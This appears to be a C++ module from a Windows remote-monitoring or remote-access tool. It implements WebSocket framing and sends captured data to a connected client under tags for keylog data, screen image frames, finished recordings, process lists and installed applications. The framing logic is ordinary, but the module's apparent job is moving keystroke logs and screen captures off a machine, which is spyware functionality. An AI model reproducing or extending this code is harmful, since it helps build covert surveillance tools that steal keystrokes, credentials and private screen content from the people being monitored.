#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <vector>
#include <atomic>
#include <algorithm>

#include "Sender.h"
#include "WSDataType.h"

bool sendAll(SOCKET s, const char* data, int len)
{
    int total = 0;
    while (total < len) {
        int sent = send(s, data + total, len - total, 0);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

void sendWsFrame(SOCKET client, uint8_t opcode, bool fin,
    const char* data, size_t len)
{
    std::vector<unsigned char> frame;
    frame.push_back((fin ? 0x80 : 0x00) | opcode);

    if (len <= 125) {
        frame.push_back((unsigned char)len);
    }
    else if (len <= 65535) {
        frame.push_back(126);
        frame.push_back((len >> 8) & 0xFF);
        frame.push_back(len & 0xFF);
    }
    else {
        frame.push_back(127);
        for (int i = 7; i >= 0; i--) {
            frame.push_back((len >> (8 * i)) & 0xFF);
        }
    }

    frame.insert(frame.end(), data, data + len);
    sendAll(client, (char*)frame.data(), frame.size());
}

void sendWsTextAuto(SOCKET client, const std::string& msg)
{
    const size_t CHUNK = 16 * 1024;

    if (msg.size() <= CHUNK) {
        sendWsFrame(client, 0x1, true, msg.data(), msg.size());
        return;
    }

    // first frame
    size_t offset = 0;
    size_t len = CHUNK;
    sendWsFrame(client, 0x1, false, msg.data(), len);
    offset += len;

    // continuation
    while (offset < msg.size()) {
        len = min(CHUNK, msg.size() - offset);
        bool fin = (offset + len >= msg.size());
        sendWsFrame(client, 0x0, fin, msg.data() + offset, len);
        offset += len;
    }
}

void sendWsAuto(SOCKET client, WSDataType type, const std::string& payload) {
    std::string msg;

    switch (type) {
    case WSDataType::KEYLOG:
        msg = "KEYLOG_DATA:" + payload;
        break;

    case WSDataType::IMAGE:
        msg = "IMAGE_FRAME:" + payload;
        sendWsFrame(client, 0x1, true, msg.data(), msg.size());
        return;

    case WSDataType::VIDEO:
        msg = "RECORD_DONE:" + payload;
        break;

    case WSDataType::LISTAPP:
        msg = payload;
        break;

    case WSDataType::LISTPROC:
        msg = "PROCESS_LIST:" + payload;
        break;
    }

    sendWsTextAuto(client, msg);
}